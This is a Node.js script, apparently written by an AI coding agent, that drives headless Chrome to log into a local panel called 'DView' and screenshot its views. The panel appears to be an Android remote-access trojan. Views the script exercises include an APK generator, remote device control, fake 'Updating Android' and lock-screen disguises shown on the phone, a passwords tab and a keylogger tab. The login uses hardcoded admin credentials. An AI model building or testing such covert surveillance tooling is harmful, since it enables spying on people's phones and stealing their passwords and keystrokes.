const http = require('http');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const CHROME_PATH = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
const artifactDir = 'C:\\Users\\Dell\\.gemini\\antigravity\\brain\\ae263ad2-5f2f-44e6-ad49-c434bcfe2bac';

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function httpGet(url) {
  return new Promise((resolve, reject) => {
    http.get(url, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

async function run() {
  const tempProfile = process.env.TEMP + '\\chrome_dview_' + Date.now();
  console.log('Launching headless Chrome on port 9444...');
  const chrome = spawn(CHROME_PATH, [
    '--headless=new',
    '--remote-debugging-port=9444',
    '--disable-gpu',
    '--window-size=1600,1000',
    `--user-data-dir=${tempProfile}`,
    '--no-first-run',
    '--no-default-browser-check',
    'http://localhost:5000/'
  ]);

  try {
    let ready = false;
    let listData = '';
    for (let i = 0; i < 30; i++) {
      await sleep(300);
      try {
        listData = await httpGet('http://127.0.0.1:9444/json/list');
        const list = JSON.parse(listData);
        if (list.length > 0 && list[0].webSocketDebuggerUrl) {
          ready = true;
          break;
        }
      } catch {}
    }
    if (!ready) throw new Error('Chrome failed to start on port 9444');

    const pages = JSON.parse(listData);
    const targetPage = pages.find(p => p.type === 'page') || pages[0];
    const wsUrl = targetPage.webSocketDebuggerUrl;

    const ws = new globalThis.WebSocket(wsUrl);
    await new Promise((resolve, reject) => {
      ws.onopen = resolve;
      ws.onerror = reject;
    });

    let msgId = 1;
    function sendCommand(method, params = {}) {
      return new Promise((resolve, reject) => {
        const id = msgId++;
        const handler = (event) => {
          const msg = JSON.parse(event.data);
          if (msg.id === id) {
            ws.removeEventListener('message', handler);
            if (msg.result) resolve(msg.result);
            else reject(new Error(JSON.stringify(msg.error)));
          }
        };
        ws.addEventListener('message', handler);
        ws.send(JSON.stringify({ id, method, params }));
      });
    }

    async function evaluate(expression) {
      const res = await sendCommand('Runtime.evaluate', { expression, returnByValue: true, awaitPromise: true });
      return res.result ? res.result.value : null;
    }

    async function saveScreenshot(filename) {
      const res = await sendCommand('Page.captureScreenshot', { format: 'png' });
      const fullPath = path.join(artifactDir, filename);
      fs.writeFileSync(fullPath, Buffer.from(res.data, 'base64'));
      console.log(`[PRINT GERADO] ${fullPath} (${fs.statSync(fullPath).size} bytes)`);
    }

    console.log('Waiting for initial page load...');
    await sleep(2500);

    // Perform REAL API login from within browser
    console.log('Logging in via API...');
    await evaluate(`
      (async () => {
        try {
          const res = await fetch('http://localhost:3000/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: 'admin@dview.local', password: 'admin123', totp: '123456' })
          });
          const data = await res.json();
          if (data && data.token) {
            localStorage.setItem('droidview.token', data.token);
            localStorage.setItem('dview.user', JSON.stringify(data.user));
            window.location.reload();
          }
        } catch (e) {
          console.error(e);
        }
      })()
    `);
    await sleep(3500);

    // Helper to click sidebar nav buttons
    async function clickNav(name) {
      console.log('Navigating to', name);
      await evaluate(`
        (function() {
          const items = Array.from(document.querySelectorAll('.nav-item-btn, .settings-nav-btn'));
          const btn = items.find(b => b.textContent && b.textContent.includes('${name}'));
          if (btn) btn.click();
        })()
      `);
      await sleep(2500);
    }

    // 1. Gerador APK
    await clickNav('Gerador APK');
    await saveScreenshot('shot_gerador_apk_full.png');

    // 2. Dashboard
    await clickNav('Dashboard');
    await saveScreenshot('shot_dashboard_full.png');

    // 3. Dispositivos / Sessão
    await clickNav('Dispositivos');
    await saveScreenshot('shot_dispositivos_full.png');

    // 4. Controle
    await clickNav('Controle');
    // Click add emulator ONLY if in empty state with zero devices
    await evaluate(`
      (function() {
        const cards = document.querySelectorAll('.control-device-card');
        if (cards.length === 0) {
          const btn = Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('Adicionar Emulador'));
          if (btn) btn.click();
        } else {
          cards[0].click();
        }
      })()
    `);
    await sleep(2500);
    await saveScreenshot('shot_controle_full.png');

    // 4b. Right-click on first device card to trigger tactical context menu
    console.log('Triggering context menu on device...');
    await evaluate(`
      (function() {
        const card = document.querySelector('.control-device-card');
        if (card) {
          const rect = card.getBoundingClientRect();
          const evt = new MouseEvent('contextmenu', {
            bubbles: true,
            cancelable: true,
            clientX: rect.left + 80,
            clientY: rect.top + 25
          });
          card.dispatchEvent(evt);
        }
      })()
    `);
    await sleep(1000);
    await saveScreenshot('shot_controle_context_menu.png');

    // Dismiss context menu
    await evaluate(`(function() {
      window.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', code: 'Escape', bubbles: true }));
      document.body.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
    })()`);
    await sleep(800);

    // 4c. Open Right Sidebar Drawer (Telas no Celular & Teclas)
    console.log('Opening right sidebar drawer...');
    await fetch('http://localhost:3000/devices/dev-emu-1/disguise', { method: 'DELETE' }).catch(() => {});
    await sleep(400);
    await evaluate(`
      (function() {
        const btn = Array.from(document.querySelectorAll('button')).find(b => b.textContent && (b.textContent.includes('TECLAS') || b.textContent.includes('TELAS')));
        if (btn) btn.click();
      })()
    `);
    await sleep(1500);

    // Switch to TELAS NO CELULAR tab
    await evaluate(`
      (function() {
        const tab = Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('TELAS NO CELULAR'));
        if (tab) tab.click();
        const dismissBtn = Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('Desativar'));
        if (dismissBtn) dismissBtn.click();
      })()
    `);
    await sleep(1200);
    await saveScreenshot('shot_controle_telas_drawer.png');

    // Activate "Atualizando Android" screen on the device
    console.log('Activating Atualizando Android on phone...');
    await evaluate(`
      (function() {
        const btn = Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('Ativar Atualização'));
        if (btn) {
          btn.scrollIntoView({ behavior: 'instant', block: 'center' });
          btn.click();
        }
      })()
    `);
    await sleep(2500);
    await saveScreenshot('shot_controle_update_active.png');

    // Select preset and activate Custom Image on the device
    console.log('Activating Custom Image on phone...');
    await evaluate(`
      (function() {
        const presetBtn = Array.from(document.querySelectorAll('button')).find(b => b.textContent && (b.textContent.includes('Bloqueio') || b.textContent.includes('Wallpaper')));
        if (presetBtn) {
          presetBtn.scrollIntoView({ behavior: 'instant', block: 'center' });
          presetBtn.click();
        }
      })()
    `);
    await sleep(1000);
    await evaluate(`
      (function() {
        const sendBtn = Array.from(document.querySelectorAll('button')).find(b => b.textContent && (b.textContent.includes('Enviar & Usar Tela') || b.textContent.includes('Imagem Ativa')));
        if (sendBtn) {
          sendBtn.scrollIntoView({ behavior: 'instant', block: 'center' });
          sendBtn.click();
        }
      })()
    `);
    await sleep(2500);
    await saveScreenshot('shot_controle_custom_image_active.png');

    // Clear disguise before proceeding
    await evaluate(`
      (function() {
        const dismissBtn = Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('Desativar'));
        if (dismissBtn) dismissBtn.click();
      })()
    `);
    await sleep(600);

    // Switch to SENHAS tab
    console.log('Switching to SENHAS tab in drawer...');
    await evaluate(`
      (function() {
        const tab = Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('SENHAS'));
        if (tab) tab.click();
      })()
    `);
    await sleep(1200);
    await saveScreenshot('shot_controle_senhas_drawer.png');

    // Switch back to TECLAS & DIGITAÇÃO tab
    await evaluate(`
      (function() {
        const tab = Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('TECLAS & DIGITAÇÃO'));
        if (tab) tab.click();
      })()
    `);
    await sleep(1000);
    await saveScreenshot('shot_controle_keylogger_drawer.png');

    // Close right sidebar drawer
    await evaluate(`
      (function() {
        const close = document.querySelector('.right-sidebar-close-btn');
        if (close) close.click();
      })()
    `);
    await sleep(600);

    // 4d. Open Screen Presets Modal
    console.log('Opening screen presets modal...');
    await evaluate(`
      (function() {
        const singleBtn = Array.from(document.querySelectorAll('.tactical-grid-btn')).find(b => b.textContent && b.textContent.trim() === '1 Tela');
        if (singleBtn) singleBtn.click();
      })()
    `);
    await sleep(1000);
    await evaluate(`
      (function() {
        const btn = document.querySelector('button[title*="telas pré-configuradas"]') || 
                    Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.trim() === 'Telas');
        if (btn) btn.click();
      })()
    `);
    await sleep(2000);
    await saveScreenshot('shot_controle_presets_modal.png');

    // Close presets modal
    await evaluate(`
      (function() {
        const close = document.querySelector('.tactical-modal-close');
        if (close) close.click();
      })()
    `);
    await sleep(800);

    // 4e. Test Floating Device Window with Left & Right Sidebars
    console.log('Opening Floating Device Window (MEmu)...');
    await evaluate(`
      (function() {
        const floatBtn = Array.from(document.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('Instância Flutuante'));
        if (floatBtn) floatBtn.click();
      })()
    `);
    await sleep(2000);
    await saveScreenshot('shot_instancia_flutuante_padrao.png');

    // Open Pastas tab (Left Drawer) inside Floating Window
    console.log('Opening Pastas inside Floating Window...');
    await evaluate(`
      (function() {
        const floatingWin = document.querySelector('.floating-device-window');
        if (!floatingWin) return;
        const pastasBtn = Array.from(floatingWin.querySelectorAll('button')).find(b => b.textContent && b.textContent.trim() === 'Pastas');
        if (pastasBtn) pastasBtn.click();
      })()
    `);
    await sleep(1500);

    // Open Senhas tab (Right Drawer) inside Floating Window
    console.log('Opening Senhas inside Floating Window...');
    await evaluate(`
      (function() {
        const floatingWin = document.querySelector('.floating-device-window');
        if (!floatingWin) return;
        const senhasBtn = Array.from(floatingWin.querySelectorAll('button')).find(b => b.textContent && b.textContent.includes('Senhas'));
        if (senhasBtn) senhasBtn.click();
      })()
    `);
    await sleep(1500);
    await saveScreenshot('shot_instancia_flutuante_sidebars_ambos.png');

    // Switch right drawer to Telas inside Floating Window
    console.log('Switching to Telas inside Floating Window...');
    await evaluate(`
      (function() {
        const floatingWin = document.querySelector('.floating-device-window');
        if (!floatingWin) return;
        const telasBtn = Array.from(floatingWin.querySelectorAll('button')).find(b => b.textContent && b.textContent.trim() === 'Telas');
        if (telasBtn) telasBtn.click();
      })()
    `);
    await sleep(1500);
    await saveScreenshot('shot_instancia_flutuante_telas_disfarce.png');

    // Close Floating Window
    await evaluate(`
      (function() {
        const closeBtn = document.querySelector('.floating-device-window .close-btn');
        if (closeBtn) closeBtn.click();
      })()
    `);
    await sleep(600);

    // 5. Configurações
    await clickNav('Configurações');
    await saveScreenshot('shot_configuracoes_full.png');

    ws.close();
    console.log('ALL SCREENSHOTS CAPTURED TO ARTIFACTS!');
  } finally {
    try { chrome.kill(); } catch {}
  }
}

run().catch(err => {
  console.error('Fatal error:', err);
  process.exit(1);
});
